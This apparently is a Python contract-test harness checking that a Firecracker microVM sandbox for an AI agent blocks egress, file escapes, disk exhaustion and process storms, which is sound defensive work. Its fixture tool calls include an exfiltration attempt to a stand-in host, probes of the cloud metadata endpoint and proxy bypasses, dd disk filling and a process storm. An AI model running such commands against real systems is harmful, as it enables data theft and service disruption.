"""The rest of Gate 8 on the Firecracker stack (stack.py), through the public API and the agent's own tools, because a
microVM has no `docker exec` and no host workspace directory:
- SEC-001 / SEC-006 (`egress`): no gateway secret reaches the guest or the transcript; exfiltration is refused; every proxy
  bypass (IP literals, other ports, UDP DNS, internal names, a CONNECT to the database port) fails, only the link port answers.
- SEC-002 (`escape`): the Docker case's TOOL-S-002/017 vectors through the real runtime's file tools and shell, inside the
  guest; the workspace is a block image, so the in-guest probe also checks what the Docker case reads from the host.
- SBX-C-015 (`full`): a command and a file tool run out of space in a 64 MiB workspace image; the run reports
  `workspace.full` once, before the first failed call's result, and continues once space is freed.
- SBX-C-013 (`destroy`): the backend's destroy (stop, forced removal) of a busy VM; the run is interrupted, resumes in a new VM
  on the same workspace image, and completes.
- GW-I-066 (`lifetime`): ARCHITECTURE §4.4 rule 1 on this backend, with the Docker stack's scenario and checks
  (deploy/tests/lifetime_case.py): a VM still busy at its max lifetime plus the grace is retired, and the run resumes in
  a new VM on the same workspace image and completes.
- SEC-017 (`history`): two conversations on one shared workspace, the second run after the first's VM idled out; the
  second guest holds exactly one state device, its own image, and nothing naming the first conversation; its VM host
  binds only its own state image; a history forged into the workspace leaves the first conversation's events unchanged
  when it resumes (history_checks.py).
- SEC-010 (`pids`): a storm of background sleeps past the guest's configured process limit stops at it (pids_checks.py);
  a second conversation's VM runs a command while the storm holds, and the stormed VM is destroyed when it idles out.
Run from the repository root, one stack at a time on the host:  TQA_DOCKER_TESTS=1 ... python3 deploy/firecracker/contract.py egress
"""
import json
import subprocess
import sys

import stack
# stack.py puts deploy/tests on the path.
import lifetime_case  # noqa: E402
import history_checks  # noqa: E402
import pids_checks  # noqa: E402

# Runs in the guest as the sandbox user; one JSON line of outcomes. Everything but the link port must fail. Outside
# addresses come from the documentation ranges: the guest's rules refuse every destination but the gateway's ports.
# Both %s are the gateway's address, which each stack draws with its network (`stack.vm_network`).
PROBE = r"""
import json, os, socket, urllib.error, urllib.request
proxy = os.environ.get("HTTP_PROXY", "")
gateway = "%s"
def tcp(host, port):
    try:
        socket.create_connection((host, port), timeout=3).close()
        return "open"
    except OSError as error:
        return type(error).__name__
def udp_dns():
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    probe.settimeout(3)
    try:
        probe.sendto(b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01", ("192.0.2.53", 53))
        probe.recv(512)
        return "answered"
    except OSError as error:
        return type(error).__name__
def via(url):
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
    try:
        return opener.open(url, timeout=6).status
    except urllib.error.HTTPError as error:
        return error.code
    except Exception as error:
        return type(error).__name__
print(json.dumps({"proxy_set": bool(proxy), "link_port": tcp(gateway, 8080), "gateway_other_port": tcp(gateway, 5432),
    "public_ip": tcp("192.0.2.1", 443), "udp_dns": udp_dns(), "proxy_denied_host": via("http://denied.invalid/collect"),
    "proxy_loopback": via("http://127.0.0.1:8080/"), "proxy_metadata": via("http://169.254.169.254/latest/meta-data/"),
    "proxy_database_name": via("http://postgres:5432/"), "proxy_connect_database": via("https://%s:5432/")}))
"""


def shell(command):
    return {"events": [{"type": "tool_call", "name": "shell", "split_into": 1, "arguments": {"command": command}}],
            "usage": {"prompt_tokens": 10, "completion_tokens": 10}}


def EGRESS(gateway):  # noqa: N802 (a case's scenario, as the other cases' constants are)
    """The egress case's scenario, its probe aimed at this stack's gateway."""
    return {"model": "fixture", "responses": [
        shell("env"),
        shell("python3 - <<'PROBE'\n" + PROBE % (gateway, gateway) + "\nPROBE"),
        {"events": [{"type": "tool_call", "name": "fetch_url", "split_into": 1,
                     "arguments": {"url": "https://denied.invalid/collect?environment=synthetic"}}],
         "usage": {"prompt_tokens": 10, "completion_tokens": 10}},
        {"events": [{"type": "text", "text": "The denied actions are recorded."}], "usage": {"prompt_tokens": 20, "completion_tokens": 10}}]}


def egress(demo):
    """SEC-001 and SEC-006 inside a microVM."""
    demo.sign_in()
    conversation = demo.request("/api/v1/conversations", {"title": "Egress", "model_route": "local"})["id"]
    demo.request("/api/v1/conversations/{}/messages".format(conversation), {"text": "Probe", "attachments": []})
    stored = stack.until(demo, conversation, ("run.completed", "run.failed"), 300)
    results = stack.tool_results(stored)
    assert len(results) == 3, results
    # SEC-001: no gateway credential in the guest's environment or anywhere in the transcript.
    transcript = json.dumps(stored)
    for name in ("TQA_BOOTSTRAP_TOKEN", "TQA_POSTGRES_PASSWORD"):
        secret = demo.env[name]
        assert secret not in results[0]["content"] and secret not in transcript, name
    assert "synthetic-compose-fixture" not in transcript, "the route's key value never reaches the sandbox"
    assert results[2]["status"] == "error", "exfiltration through fetch_url is refused: {}".format(results[2])
    # SEC-006: only the link port answers; every bypass fails.
    line = next(line for line in results[1]["content"].splitlines() if line.startswith("{"))
    probes = json.loads(line)
    assert probes["proxy_set"] and probes["link_port"] == "open", probes
    blocked = {name: value for name, value in probes.items() if name not in ("proxy_set", "link_port")}
    opened = {name: value for name, value in blocked.items() if value in ("open", "answered") or (isinstance(value, int) and value < 400)}
    assert not opened, "bypasses that worked: {}".format(opened)
    print("SEC-001/SEC-006 on Firecracker: no secret in the guest or the transcript; exfiltration refused; "
          "every bypass failed: {}".format(json.dumps(blocked, sort_keys=True)), flush=True)


DESTROY = {"model": "fixture", "responses": [
    shell("printf kept > marker"), shell("echo started && sleep 25 && echo finished"), shell("cat marker"),
    {"events": [{"type": "text", "text": "Resumed after the destroy."}], "usage": {"prompt_tokens": 20, "completion_tokens": 10}}]}


def destroy(demo):
    """SBX-C-013: the backend's own destroy (stop, then forced removal) of a busy VM; the run is interrupted, resumes in
    a new VM on the same image and completes. The gateway never destroys a busy sandbox itself, so the test performs
    the destroy's two engine calls on the VM host while the second call runs."""
    import time
    demo.sign_in()
    conversation = demo.request("/api/v1/conversations", {"title": "Destroy", "model_route": "local"})["id"]
    demo.request("/api/v1/conversations/{}/messages".format(conversation), {"text": "Work", "attachments": []})
    deadline = time.monotonic() + 180
    while sum(frame.get("event", {}).get("type") == "tool.start" for frame in stack.events(demo, conversation)) < 2:
        assert time.monotonic() < deadline, "the second call never started"
        time.sleep(0.5)
    first = demo.vm_hosts()
    assert len(first) == 1, first
    stopped = subprocess.run(["docker", "stop", "-t", "2", first[0]], capture_output=True, text=True, timeout=60)
    assert stopped.returncode == 0, "docker stop failed (exit {}): {}".format(stopped.returncode, stopped.stderr.strip())
    # The gateway may see the stop and remove the VM host itself before this removal; that is the destroy's own
    # outcome, not a failure. The engine's words are printed either way, so a race is proven, not assumed.
    removal = subprocess.run(["docker", "rm", "--force", first[0]], capture_output=True, text=True, timeout=60)
    outcome = stack.forced_removal(removal.returncode, removal.stderr)
    print("destroy: docker rm --force {}: {}{}".format(first[0], outcome,
                                                        " ({})".format(removal.stderr.strip()) if removal.stderr else ""),
          flush=True)
    stored = stack.until(demo, conversation, ("run.completed", "run.failed"), 300)
    order = [frame.get("event", {}).get("type") for frame in stored]
    assert order[-1] == "run.completed" and "run.resumed" in order, order
    results = stack.tool_results(stored)
    assert [result["status"] for result in results] == ["ok", "interrupted", "ok"], results
    assert results[2]["content"].strip() == "kept", results
    assert demo.vm_hosts() not in ([], first), "a new VM host served the resumed run"
    print("SBX-C-013 on Firecracker: a busy VM destroyed mid-call; the run resumed in a new VM on the same image and "
          "completed", flush=True)


def lifetime(demo):
    """GW-I-066: the gateway retires a busy VM at its max lifetime plus the grace; the run resumes in a new VM."""
    demo.sign_in()
    conversation = demo.request("/api/v1/conversations", {"title": "Lifetime", "model_route": "local"})["id"]
    demo.request("/api/v1/conversations/{}/messages".format(conversation), {"text": "Work", "attachments": []})
    stored, interrupted = lifetime_case.watch(lambda: stack.events(demo, conversation))
    log = stack.compose.command(demo.configuration + ["logs", "--no-color", "gateway"], demo.env, capture=True,
                                timeout=60).stdout
    print(lifetime_case.check(stored, interrupted, log) + " (Firecracker)", flush=True)


# Served in arrival order across both conversations (the case runs them one after the other): the first conversation's
# turn is harmless, only the second runs the probe, and the first's resume is harmless again. A model retry would
# shift the order and fail loudly (no probe record), never silently.
HISTORY = {"model": "fixture", "select": "arrival", "responses": [
    shell("printf first > first.txt"),
    {"events": [{"type": "text", "text": "Written."}], "usage": {"prompt_tokens": 20, "completion_tokens": 5}},
    shell("python3 - <<'SEC017'\n" + history_checks.PROBE + "\nSEC017"),
    {"events": [{"type": "text", "text": "Probed."}], "usage": {"prompt_tokens": 20, "completion_tokens": 5}},
    shell("echo resumed"),
    {"events": [{"type": "text", "text": "Resumed."}], "usage": {"prompt_tokens": 20, "completion_tokens": 5}}]}


class Member:
    """A second account's own cookie session, through the same public origin."""

    def __init__(self, demo, email):
        import http.cookiejar
        import secrets
        import urllib.request
        self.demo, self.email, self.password = demo, email, "synthetic-member-" + secrets.token_hex(16)
        self.client = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar()))

    def request(self, path, body=None):
        import secrets
        import urllib.request
        headers = {"Origin": self.demo.origin, "Content-Type": "application/json"}
        if body is not None:
            headers["Idempotency-Key"] = secrets.token_hex(16)
        data = None if body is None else json.dumps(body).encode()
        with self.client.open(urllib.request.Request(self.demo.origin + path, headers=headers, data=data),
                              timeout=30) as response:
            payload = response.read(1048577)
        return json.loads(payload) if payload else None


def history(demo):
    """SEC-017 on the microVM: the shared workspace's second conversation can't reach the first's history."""
    import time
    demo.sign_in()
    member = Member(demo, "member@example.invalid")
    token = demo.request("/api/v1/invitations", {"email": member.email, "role": "member"})["token"]
    member.request("/api/v1/invitations/accept", {"token": token, "password": member.password})
    member.request("/api/v1/auth/login", {"email": member.email, "password": member.password})
    workspace = demo.request("/api/v1/workspaces", {"name": "Shared history"})["id"]
    deadline = time.monotonic() + 120
    while demo.request("/api/v1/workspaces/" + workspace)["state"] != "ready":
        assert time.monotonic() < deadline, "the workspace never became ready"
        time.sleep(1)
    demo.request("/api/v1/workspaces/{}/shares".format(workspace), {"email": member.email, "access": "write"},
                 method="PUT")
    first = demo.request("/api/v1/conversations", {"title": "First", "model_route": "local",
                                                    "workspace_id": workspace})["id"]
    demo.request("/api/v1/conversations/{}/messages".format(first), {"text": "Probe", "attachments": []})
    before = stack.until(demo, first, ("run.completed", "run.failed"), 300)
    assert before[-1].get("event", {}).get("type") == "run.completed", before[-1]
    second = member.request("/api/v1/conversations", {"title": "Second", "model_route": "local",
                                                      "workspace_id": workspace})["id"]
    member.request("/api/v1/conversations/{}/messages".format(second), {"text": "Probe", "attachments": []})
    # The second run waits for the workspace until the first VM idles out (idle_seconds below).
    deadline = time.monotonic() + 300
    while True:
        stored = member.request("/api/v1/conversations/{}/events?after=0&limit=1000".format(second))["items"]
        kinds = [frame.get("event", {}).get("type") for frame in stored]
        if "run.completed" in kinds or "run.failed" in kinds:
            break
        assert time.monotonic() < deadline, "the second conversation's run never ended"
        time.sleep(0.5)
    assert kinds[-1] == "run.completed", kinds[-3:]
    host = host_of(demo, second)
    assert host, "the second conversation's VM host is gone before it could be inspected"
    record = json.loads(subprocess.run(["docker", "inspect", host], capture_output=True, text=True,
                                       check=True).stdout)[0]
    output = next(frame["event"]["content"] for frame in stored if frame.get("event", {}).get("type") == "tool.result")
    problems = history_checks.guest_problems(output, first, second)
    problems += history_checks.host_problems(record.get("Mounts", []), first, second)
    demo.request("/api/v1/conversations/{}/messages".format(first), {"text": "Resume", "attachments": []})
    after_run = time.monotonic() + 300
    while True:
        after = stack.events(demo, first)
        runs = [frame for frame in after if frame.get("event", {}).get("type") in ("run.completed", "run.failed")]
        if len(runs) >= 2:
            break
        assert time.monotonic() < after_run, "the first conversation did not resume"
        time.sleep(0.5)
    problems += history_checks.history_problems(before, after)
    dump = history_checks.marker_frames(after)
    if dump:
        # The first conversation never runs the probe, so any marker in its history is worth seeing whole.
        print("marker-bearing frames in the first conversation's history: " + json.dumps(dump), flush=True)
        problems.append("the forged marker appears in the first conversation's history ({} frames)".format(len(dump)))
    assert not problems, problems
    print("SEC-017 on Firecracker: the second conversation on the shared workspace held one state device, its own; "
          "nothing in its guest or VM host named the first; a forged history left the first unchanged", flush=True)


def gateway_restart(demo, *, stop_vms=False):
    """Stops the gateway (and, for a host reboot, every VM host), then starts it again and waits until it is ready."""
    import time
    stack.compose.command(demo.configuration + ["stop", "--timeout", "10", "gateway"], demo.env, timeout=60)
    if stop_vms:
        for host in demo.vm_hosts():
            subprocess.run(["docker", "stop", "-t", "2", host], check=True, capture_output=True, timeout=60)
    stack.compose.command(demo.configuration + ["start", "gateway"], demo.env, timeout=120)
    deadline = time.monotonic() + 120
    while time.monotonic() < deadline:
        try:
            demo.request("/readyz")
            return
        except OSError:
            time.sleep(1)
    raise AssertionError("the gateway did not come back")


def host_of(demo, conversation):
    """The VM host container serving `conversation`, if any (running or exited)."""
    listed = subprocess.run(["docker", "ps", "-aq", "--filter", "label=tqa.conversation=" + conversation],
                            capture_output=True, text=True, check=True).stdout.split()
    return listed[0] if listed else None


# The guest's process limit this case configures ([sandbox] pids), and checks the stormed guest reports.
PIDS_CONFIGURED = 256
NEIGHBOUR_MARK = "neighbour-answered"
PIDS = {"model": "fixture", "select": "arrival", "responses": [
    shell("python3 - <<'STORM'\n" + pids_checks.STORM + "STORM"),
    shell("echo " + NEIGHBOUR_MARK),
    {"events": [{"type": "text", "text": "The neighbour ran."}], "usage": {"prompt_tokens": 20, "completion_tokens": 5}},
    {"events": [{"type": "text", "text": "The storm ended."}], "usage": {"prompt_tokens": 20, "completion_tokens": 5}}]}


def first_result(stored):
    """The first tool result frame (its time and its event)."""
    return next(frame for frame in stored if frame.get("event", {}).get("type") == "tool.result")


def pids(demo):
    """SEC-010 on the microVM: the storm stops at the guest's configured limit, a neighbour VM still runs a command
    while it holds, and the stormed VM can still be destroyed."""
    import time
    from soak_audit import timestamp_seconds
    demo.sign_in()
    stormed = demo.request("/api/v1/conversations", {"title": "Storm", "model_route": "local"})["id"]
    demo.request("/api/v1/conversations/{}/messages".format(stormed), {"text": "Storm", "attachments": []})
    stack.until(demo, stormed, ("tool.start",), 300)
    neighbour = demo.request("/api/v1/conversations", {"title": "Neighbour", "model_route": "local"})["id"]
    demo.request("/api/v1/conversations/{}/messages".format(neighbour), {"text": "Neighbour", "attachments": []})
    beside = stack.until(demo, neighbour, ("run.completed", "run.failed"), 300)
    stored = stack.until(demo, stormed, ("run.completed", "run.failed"), 300)
    problems = []
    for name, frames in (("stormed", stored), ("neighbour", beside)):
        if frames[-1].get("event", {}).get("type") != "run.completed":
            problems.append("the {} conversation's run did not complete: {}".format(name, stack.timeline(frames)))
    storm, answered = first_result(stored), first_result(beside)
    problems += pids_checks.problems(storm["event"]["content"], configured=PIDS_CONFIGURED)
    if NEIGHBOUR_MARK not in answered["event"]["content"]:
        problems.append("the neighbour's command did not run: {}".format(answered["event"]["content"][:200]))
    if timestamp_seconds(answered["ts"]) >= timestamp_seconds(storm["ts"]):
        problems.append("the neighbour answered only after the storm ended, so it proves nothing about the storm")
    # The stormed VM idles out (idle_seconds below) and the backend destroys it.
    deadline = time.monotonic() + 180
    while host_of(demo, stormed):
        if time.monotonic() > deadline:
            problems.append("the stormed VM's host still exists 180 s after its run")
            break
        time.sleep(2)
    assert not problems, problems
    report = next(line for line in storm["event"]["content"].splitlines() if line.startswith("pids max="))
    print("SEC-010 on Firecracker: {}; the neighbour VM ran its command during the storm; the stormed VM was "
          "destroyed after it idled".format(report), flush=True)

RECONCILE = {"model": "fixture", "responses": [
    {"events": [{"type": "text", "text": "ready {}".format(index)}], "usage": {"prompt_tokens": 10, "completion_tokens": 5}}
    for index in range(3)]}


def reconcile(demo):
    """SBX-C-008 on the full stack: three live VMs; one loses its row; after a gateway restart the orphan is destroyed
    and the two bound VMs are kept."""
    demo.sign_in()
    conversations = []
    for index in range(3):
        conversation = demo.request("/api/v1/conversations", {"title": "Bound {}".format(index), "model_route": "local"})["id"]
        demo.request("/api/v1/conversations/{}/messages".format(conversation), {"text": "hi", "attachments": []})
        stack.until(demo, conversation, ("run.completed",), 180)
        conversations.append(conversation)
    hosts = {conversation: host_of(demo, conversation) for conversation in conversations}
    assert all(hosts.values()) and len(set(hosts.values())) == 3, hosts
    orphan = conversations[1]
    stack.compose.command(demo.configuration + ["exec", "-T", "postgres", "psql", "-U", "tqa", "-d", "gateway", "-c",
                                                "DELETE FROM sandbox_instances WHERE conversation_id = '{}'".format(orphan)],
                          demo.env, timeout=60)
    gateway_restart(demo)
    import time
    deadline = time.monotonic() + 120
    while host_of(demo, orphan) and time.monotonic() < deadline:
        time.sleep(1)
    assert host_of(demo, orphan) is None, "the orphaned VM host was destroyed"
    for conversation in (conversations[0], conversations[2]):
        assert host_of(demo, conversation) == hosts[conversation], "the bound VM host was kept"
    print("SBX-C-008 on Firecracker: after a restart the orphaned VM host was destroyed and the two bound ones kept",
          flush=True)


REBOOT = {"model": "fixture", "responses": [
    shell("printf kept > marker"), shell("sleep 25"), shell("cat marker"),
    {"events": [{"type": "text", "text": "Resumed after the reboot."}], "usage": {"prompt_tokens": 20, "completion_tokens": 10}}]}


def reboot(demo):
    """SBX-F-007 on the full stack: gateway and VM hosts stop mid-run (a host reboot); the exited VM host is destroyed
    at reconciliation and the run resumes in a new VM and completes."""
    import time
    demo.sign_in()
    conversation = demo.request("/api/v1/conversations", {"title": "Reboot", "model_route": "local"})["id"]
    demo.request("/api/v1/conversations/{}/messages".format(conversation), {"text": "Work", "attachments": []})
    deadline = time.monotonic() + 180
    while sum(frame.get("event", {}).get("type") == "tool.start" for frame in stack.events(demo, conversation)) < 2:
        assert time.monotonic() < deadline, "the second call never started"
        time.sleep(0.5)
    before = host_of(demo, conversation)
    gateway_restart(demo, stop_vms=True)
    stored = stack.until(demo, conversation, ("run.completed", "run.failed"), 300)
    order = [frame.get("event", {}).get("type") for frame in stored]
    assert order[-1] == "run.completed" and "run.resumed" in order, order
    results = stack.tool_results(stored)
    assert results[0]["status"] == "ok" and results[-1]["content"].strip() == "kept", results
    assert "interrupted" in [result["status"] for result in results], results
    after = host_of(demo, conversation)
    assert after and after != before, "a new VM host served the resumed run"
    gone = subprocess.run(["docker", "inspect", before], capture_output=True, check=False).returncode != 0
    assert gone, "the exited VM host was destroyed at reconciliation"
    print("SBX-F-007 on Firecracker: after a host-reboot restart the exited VM host was destroyed and the run resumed in "
          "a new VM and completed", flush=True)



def confinement():
    """The Docker SEC-002 case's scenario and vectors (crates/tqa-sandbox/tests/egress/confinement.py), shared as is."""
    sys.path.insert(0, str(stack.ROOT / "crates/tqa-sandbox/tests/egress"))
    import confinement as shared
    return shared


def escape(demo):
    """SEC-002 inside a microVM: every file-tool escape is refused with its typed code and reads nothing outside; a
    .git/config write inside the workspace works (ADR-0035); absolute workspace, tmp and own-state writes work; root and
    token writes fail; outside canaries are unchanged (checked in the guest: a block image has no host directory to
    read)."""
    shared = confinement()
    demo.sign_in()
    conversation = demo.request("/api/v1/conversations", {"title": "Escape", "model_route": "local"})["id"]
    demo.request("/api/v1/conversations/{}/messages".format(conversation), {"text": "Probe", "attachments": []})
    stored = stack.until(demo, conversation, ("run.completed", "run.failed"), 300)
    assert [frame["seq"] for frame in stored] == list(range(1, len(stored) + 1)), "a contiguous stream"
    kinds = [frame.get("event", {}).get("type") for frame in stored]
    assert kinds[-1] == "run.completed", kinds
    assert not any(frame["type"] == "permission.request" for frame in stored)
    events = [frame["event"] for frame in stored if frame.get("event")]
    calls = [event for event in events if event["type"] == "tool.call"]
    by_id = {event["call_id"]: event for event in events if event["type"] == "tool.result"}
    expected, permitted = shared.attempts(), shared.allowed()
    assert len(calls) == len(by_id) == len(expected) + len(permitted) + 3, "a scripted call or result is missing"
    for call, (name, arguments) in zip(calls[1 + len(expected):-2], permitted):
        assert (call["name"], call["arguments"]) == (name, arguments)
        assert by_id[call["call_id"]]["status"] == "ok", "a write inside the workspace was refused: " + arguments["path"]
    for call, (name, arguments, code) in zip(calls[1:1 + len(expected)], expected):
        assert (call["name"], call["arguments"]) == (name, arguments)
        result = by_id[call["call_id"]]
        assert result["status"] == "error", "file-tool escape succeeded: {} {}".format(name, arguments.get("path", "")[:40])
        assert result["content"].startswith(code + ":"), "wrong typed refusal: {}".format(result["content"][:120])
        assert "outside-read-marker" not in result["content"], "outside content was read"
    for call, witness in [(calls[0], "absolute workspace, tmp and own-state writes succeeded"),
                          (calls[-2], "workspace-positive"),
                          (calls[-1], "outside canaries unchanged; root and token writes refused")]:
        result = by_id[call["call_id"]]
        assert result["status"] == "ok" and witness in result["content"], "positive control failed: {}".format(
            result["content"][-300:])
    print("SEC-002 on Firecracker: {} file-tool escapes refused with typed codes; a .git/config write inside the "
          "workspace allowed (ADR-0035); absolute workspace/tmp/state writes allowed; root/token writes refused; outside "
          "canaries unchanged".format(len(expected)), flush=True)



def call(name, arguments):
    return {"events": [{"type": "tool_call", "name": name, "split_into": 1, "arguments": arguments}],
            "usage": {"prompt_tokens": 10, "completion_tokens": 10}}


# A small workspace quota: its image (the quota plus 128 MiB of ext4 metadata) fills in seconds on a slow disk.
SMALL_WORKSPACE = 64 << 20
FULL = {"model": "fixture", "responses": [
    # ext4 releases space reserved for delayed allocation once data is flushed: fill again after a sync, so nothing
    # is left for the next write.
    shell("dd if=/dev/zero of=fill bs=1M count=128; sync; dd if=/dev/zero of=rest bs=4k"),
    call("write_file", {"path": "note.txt", "content": "x" * 8192, "create_parents": False}),
    shell("rm fill rest && echo freed"),
    {"events": [{"type": "text", "text": "Space freed."}], "usage": {"prompt_tokens": 20, "completion_tokens": 10}}]}


def full(demo):
    """SBX-C-015 on the full stack: ENOSPC inside the guest from a command and from a file tool; one typed
    workspace.full event, just before the first failed call's result; the run continues after space is freed."""
    demo.sign_in()
    conversation = demo.request("/api/v1/conversations", {"title": "Full", "model_route": "local"})["id"]
    demo.request("/api/v1/conversations/{}/messages".format(conversation), {"text": "Fill", "attachments": []})
    stored = stack.until(demo, conversation, ("run.completed", "run.failed"), 300)
    events = [frame["event"] for frame in stored if frame.get("event")]
    kinds = [event["type"] for event in events]
    assert kinds[-1] == "run.completed", kinds
    calls = [event["call_id"] for event in events if event["type"] == "tool.call"]
    results = stack.tool_results(stored)
    assert [result["status"] for result in results] == ["error", "error", "ok"], results
    assert "No space left on device" in results[0]["content"], results[0]["content"][-300:]
    assert results[1]["content"].startswith("workspace_full: "), results[1]["content"][:200]
    assert results[2]["content"].strip() == "freed", results[2]
    reported = [index for index, event in enumerate(events) if event["type"] == "workspace.full"]
    assert len(reported) == 1, "one workspace.full per run: {}".format(kinds)
    event, following = events[reported[0]], events[reported[0] + 1]
    assert event["call_id"] == calls[0], (event, calls)
    assert following["type"] == "tool.result" and following["call_id"] == calls[0], following
    print("SBX-C-015 on Firecracker: ENOSPC inside the guest from a command and from a file tool (workspace_full); one "
          "workspace.full before the first failed call's result; the run continued after space was freed", flush=True)


# Every call runs (ADR-0035): no case needs a permissions section any more.
CASES = {"egress": (EGRESS, egress, "", ""),
         "escape": (confinement().scenario(), escape, "", ""),
         "full": (FULL, full, "", ""),
         "destroy": (DESTROY, destroy, "", ""),
         "lifetime": (lifetime_case.SCENARIO, lifetime, lifetime_case.SETTINGS, ""),
         # A long idle window keeps the three VMs live until the restart.
         "reconcile": (RECONCILE, reconcile, "idle_seconds=1800\n", ""),
         "reboot": (REBOOT, reboot, "", ""),
         # A short idle window hands the shared workspace from one conversation to the other quickly.
         "history": (HISTORY, history, "idle_seconds=30\n", ""),
         # The limit the storm must stop at, and a short idle window so the stormed VM is destroyed soon after.
         "pids": (PIDS, pids, "idle_seconds=30\npids={}\n".format(PIDS_CONFIGURED), "")}

if __name__ == "__main__":
    if len(sys.argv) != 2 or sys.argv[1] not in CASES:
        raise SystemExit("usage: contract.py {" + ",".join(CASES) + "}")
    scenario, check, settings, appended = CASES[sys.argv[1]]
    stack.run(sys.argv[1], scenario, check, settings, appended,
              SMALL_WORKSPACE if sys.argv[1] == "full" else stack.WORKSPACE_QUOTA)
